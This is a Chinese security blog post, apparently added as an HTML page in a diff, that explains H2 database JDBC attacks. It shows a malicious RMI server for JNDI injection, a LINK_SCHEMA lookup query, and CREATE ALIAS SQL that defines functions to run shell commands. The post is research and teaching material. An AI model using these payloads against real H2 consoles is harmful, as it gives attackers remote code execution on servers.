@@ -1,0 +1,859 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 PrefaceJDBC是JDK提供的一个用于连接数据库的接口(Java DataBase Connectivity)，各个数据库厂商(MySQL、Oracle、SQLServer)负责编写自己的JDBC实现类，再把这些实现类打包为驱动jar包，我们使用JDBC的接口编程，背后调用的实则是实现类里的方法。 常见的JDBC使用方法是在配置文件中写好JDBC引擎、连接数据库的URL、账户、密码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDBC Attack in H2 DB">
+<meta property="og:url" content="http://example.com/2023/08/09/h2rce/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="0x00 PrefaceJDBC是JDK提供的一个用于连接数据库的接口(Java DataBase Connectivity)，各个数据库厂商(MySQL、Oracle、SQLServer)负责编写自己的JDBC实现类，再把这些实现类打包为驱动jar包，我们使用JDBC的接口编程，背后调用的实则是实现类里的方法。 常见的JDBC使用方法是在配置文件中写好JDBC引擎、连接数据库的URL、账户、密码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20230809182130728.png">
+<meta property="og:image" content="http://example.com/img/image-20230809182742838.png">
+<meta property="og:image" content="http://example.com/img/image-20230809184419915.png">
+<meta property="og:image" content="http://example.com/img/image-20230809204935288.png">
+<meta property="og:image" content="http://example.com/img/image-20230809205627851.png">
+<meta property="og:image" content="http://example.com/img/image-20230810093657541.png">
+<meta property="og:image" content="http://example.com/img/image-20230810111614358.png">
+<meta property="og:image" content="http://example.com/img/image-20230810111117389-1691679021218-1.png">
+<meta property="og:image" content="http://example.com/img/image-20230810100610909.png">
+<meta property="og:image" content="http://example.com/img/image-20230810100825693.png">
+<meta property="og:image" content="http://example.com/img/image-20230810145651068.png">
+<meta property="og:image" content="http://example.com/img/image-20230810145914667.png">
+<meta property="og:image" content="http://example.com/img/image-20230810150159093.png">
+<meta property="og:image" content="http://example.com/img/image-20230810150412707.png">
+<meta property="og:image" content="http://example.com/img/image-20230810150806183.png">
+<meta property="og:image" content="http://example.com/img/image-20230810154754442.png">
+<meta property="og:image" content="http://example.com/img/image-20230810155131958.png">
+<meta property="og:image" content="http://example.com/img/image-20230810152333492.png">
+<meta property="og:image" content="http://example.com/img/image-20230810160713450.png">
+<meta property="og:image" content="http://example.com/img/image-20230810163716096.png">
+<meta property="og:image" content="http://example.com/img/image-20230810164626253.png">
+<meta property="og:image" content="http://example.com/img/image-20230810182752759.png">
+<meta property="og:image" content="http://example.com/img/image-20230810182816425.png">
+<meta property="og:image" content="http://example.com/img/image-20230810182917740.png">
+<meta property="og:image" content="http://example.com/img/image-20230810183249317.png">
+<meta property="og:image" content="http://example.com/img/image-20230810170824027.png">
+<meta property="og:image" content="http://example.com/img/image-20230810231831479.png">
+<meta property="og:image" content="http://example.com/img/image-20230811095343295.png">
+<meta property="og:image" content="http://example.com/img/image-20230811102607809.png">
+<meta property="og:image" content="http://example.com/img/image-20230811103427436.png">
+<meta property="og:image" content="http://example.com/img/image-20230811104152849.png">
+<meta property="article:published_time" content="2023-08-09T09:28:57.000Z">
+<meta property="article:modified_time" content="2023-08-11T05:57:27.994Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="jdbc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20230809182130728.png">
+  
+  
+  
+  <title>JDBC Attack in H2 DB - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JDBC Attack in H2 DB"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-09 17:28" pubdate>
+          2023年8月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          96 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JDBC Attack in H2 DB</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0x00-Preface"><a href="#0x00-Preface" class="headerlink" title="0x00 Preface"></a>0x00 Preface</h1><p>JDBC是JDK提供的一个用于连接数据库的接口(Java DataBase Connectivity)，各个数据库厂商(MySQL、Oracle、SQLServer)负责编写自己的JDBC实现类，再把这些实现类打包为驱动jar包，我们使用JDBC的接口编程，背后调用的实则是实现类里的方法。</p>
+<p>常见的JDBC使用方法是在配置文件中写好JDBC引擎、连接数据库的URL、账户、密码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>;  <span class="hljs-comment">//test数据库</span><br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><span class="hljs-comment">// 建立连接</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(JDBC_URL, JDBC_USER,<br>JDBC_PASSWORD);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 访问数据库</span><br><span class="hljs-comment">// 关闭连接</span><br>conn.close();<br></code></pre></td></tr></table></figure>
+
+<p>之前在学MySQL的JDBC攻击手法就有这个疑惑了，JDBC连接的URL怎么能够让用户控制得到呢?实际在一些场景中，比如后台修改数据库配置、测试数据库连接中，管理员就可以控制JDBC的连接URL。因此这类漏洞主要是在后台管理(当然第一步得攻进后台，未授权、弱密钥、逻辑漏洞等等等)。本文介绍h2 database的相关漏洞</p>
+<p>H2是一个用Java编写的数据库，支持内存(有点像sqlite)、文件等模式，只有一个jar文件，适合作为嵌入式数据库使用。主要用于单元测试。H2提供了一个web控制台用于操作和管理数据库。</p>
+<h1 id="0x01-Getting-Started-in-h2"><a href="#0x01-Getting-Started-in-h2" class="headerlink" title="0x01 Getting Started in h2"></a>0x01 Getting Started in h2</h1><p>h2 database console可以整合到SpringBoot中，也可以独立启动(其内置了一个WebServer)</p>
+<p>H2支持运行三种模式：</p>
+<p>Embedded(嵌入式)-&gt;无需配置本地&#x2F;远程数据库; 数据库连接关闭时, 数据与表结构依然存在;</p>
+<p>In-Memory(内存模式)-&gt;无需配置本地&#x2F;远程数据库, 但数据库连接关闭时，数据与表结构丢失;</p>
+<p>ServerMode(传统模式)-&gt;需要配置本地&#x2F;远程数据库;</p>
+<h2 id="jar启动"><a href="#jar启动" class="headerlink" title="jar启动"></a>jar启动</h2><p>在<a target="_blank" rel="noopener" href="http://www.h2database.com/html/cheatSheet.html">官网</a>下载jar包，调用里面的<code>org.h2.tools.Server</code>类</p>
+<p><code>java -cp .\h2-2.2.220.jar org.h2.tools.Server -help</code></p>
+<p><img src="/./../img/image-20230809182130728.png" srcset="/img/loading.gif" lazyload alt="image-20230809182130728"></p>
+<p><code>java -cp .\h2-2.2.220.jar org.h2.tools.Server -web -webAllowOthers</code></p>
+<p>启动Web console，默认监听8082端口</p>
+<p>H2的Web console不仅可以连接H2数据库，也可以连接其他支持JDBC API的数据库</p>
+<p><img src="/./../img/image-20230809182742838.png" srcset="/img/loading.gif" lazyload alt="image-20230809182742838"></p>
+<p>H2数据库默认用户名为sa、密码为空</p>
+<p><img src="/./../img/image-20230809184419915.png" srcset="/img/loading.gif" lazyload alt="image-20230809184419915"></p>
+<h2 id="Springboot整合"><a href="#Springboot整合" class="headerlink" title="Springboot整合"></a>Springboot整合</h2><p>引入pom依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在<code>application.properties</code>中添加h2连接的配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">spring.datasource.driver-class-name=org.h2.Driver<br>spring.datasource.url=jdbc:h2:mem:test<br>spring.datasource.username=sa<br>spring.datasource.password=<br><br>spring.h2.console.enabled=true<br>spring.h2.console.path=/h2<br>spring.h2.console.settings.trace=false<br>spring.h2.console.settings.web-allow-others=true<br></code></pre></td></tr></table></figure>
+
+<p>注意这里springboot可以修改h2 console的访问路径，若未配置此项默认为<code>h2-console</code></p>
+<p>简单写个demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.h2.Entity;<br><br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> javax.persistence.*;<br><br><span class="hljs-meta">@Entity</span><br><span class="hljs-meta">@Table(name = &quot;t_user&quot;)</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.h2.repository;<br><br><span class="hljs-keyword">import</span> com.demo.h2.Entity.User;<br><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;User, Integer&gt; &#123;&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.h2.controller;<br><br><span class="hljs-keyword">import</span> com.demo.h2.Entity.User;<br><span class="hljs-keyword">import</span> com.demo.h2.repository.UserRepository;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.util.Assert;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> UserRepository userRepository;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/user/create&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">createUser</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setName(<span class="hljs-string">&quot;taco&quot;</span>);<br>        user.setAge(<span class="hljs-number">18</span>);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> userRepository.save(user);<br>        Assert.notNull(user.getId(), <span class="hljs-string">&quot;Id Is Null&quot;</span>);<br>        <span class="hljs-keyword">return</span> result.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>/user/create</code>创建用户</p>
+<p>访问<code>/h2</code>控制台</p>
+<p><img src="/./../img/image-20230809204935288.png" srcset="/img/loading.gif" lazyload alt="image-20230809204935288"></p>
+<p><img src="/./../img/image-20230809205627851.png" srcset="/img/loading.gif" lazyload alt="image-20230809205627851"></p>
+<h1 id="0x02-h2-JNDI"><a href="#0x02-h2-JNDI" class="headerlink" title="0x02 h2 JNDI"></a>0x02 h2 JNDI</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8025</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;touch /tmp/h2-jndi-success&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230810093657541.png" srcset="/img/loading.gif" lazyload alt="image-20230810093657541"></p>
+<p>高版本的H2只允许JNDI lookup的URL以java开头</p>
+<p><img src="/./../img/image-20230810111614358.png" srcset="/img/loading.gif" lazyload alt="image-20230810111614358"></p>
+<p>翻了一下H2的函数文档，发现一处可能造成JNDI注入的。<code>LINK_SCHEMA</code></p>
+<p><a target="_blank" rel="noopener" href="http://www.h2database.com/html/functions.html#link_schema">http://www.h2database.com/html/functions.html#link_schema</a></p>
+<p><img src="/./../img/image-20230810111117389-1691679021218-1.png" srcset="/img/loading.gif" lazyload alt="image-20230810111117389"></p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">SELECT * FROM LINK_SCHEMA(&#x27;p4d0rn&#x27;, &#x27;javax.naming.InitialContext&#x27;, &#x27;rmi<span class="hljs-symbol">://127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8025</span>/evil&#x27;, &#x27;p4d0rn&#x27;, &#x27;p4d0rn&#x27;, &#x27;PUBLIC&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>同样高版本对URL进行了限制，只允许java开头</p>
+<h1 id="0x03-h2-RCE"><a href="#0x03-h2-RCE" class="headerlink" title="0x03 h2 RCE"></a>0x03 h2 RCE</h1><p>JNDI注入受到不出网的限制，能否直接执行命令呢</p>
+<h2 id="UDF执行"><a href="#UDF执行" class="headerlink" title="UDF执行"></a>UDF执行</h2><ul>
+<li><code>CREATE ALIAS</code></li>
+</ul>
+<p>自定义函数</p>
+<p>创建一个shell函数并调用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> ALIAS IF <span class="hljs-keyword">EXISTS</span> shell;<br><span class="hljs-keyword">CREATE</span> ALIAS shell <span class="hljs-keyword">AS</span> $$void shell(String s) throws Exception &#123;<br>	java.lang.Runtime.getRuntime().<span class="hljs-keyword">exec</span>(s);<br>&#125;$$;<br><span class="hljs-keyword">SELECT</span> shell(<span class="hljs-string">&#x27;cmd /c calc&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>h2中两个<code>$</code>表示无需转义的长字符串</p>
+<p><img src="/./../img/image-20230810100610909.png" srcset="/img/loading.gif" lazyload alt="image-20230810100610909"></p>
+<p>返回执行结果:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS SHELLEXEC <span class="hljs-keyword">AS</span> $$String shellexec(String cmd) throws java.io.IOException&#123;<br>	java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); <br>	<span class="hljs-keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;; <br>&#125;$$;<br><br><span class="hljs-keyword">CALL</span> SHELLEXEC(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20230810100825693.png" srcset="/img/loading.gif" lazyload alt="image-20230810100825693"></p>
+<h3 id="坑：lombok编译之殇"><a href="#坑：lombok编译之殇" class="headerlink" title="坑：lombok编译之殇"></a>坑：lombok编译之殇</h3><p>项目中使用了lombok，导致H2动态编译的类无法加载。换成高版本的H2就可以了（一开始还以为是低版本无法用户自定义函数。。。）</p>
+<p>下面看一下用户自定义函数的过程🙄</p>
+<p>运行如下SQL</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS PRINT <span class="hljs-keyword">AS</span> $$ void print(String s) &#123;<br>    System.out.println(s); &#125; $$;<br></code></pre></td></tr></table></figure>
+
+<p><code>org.h2.command.ddl.CreateFunctionAlias#update</code></p>
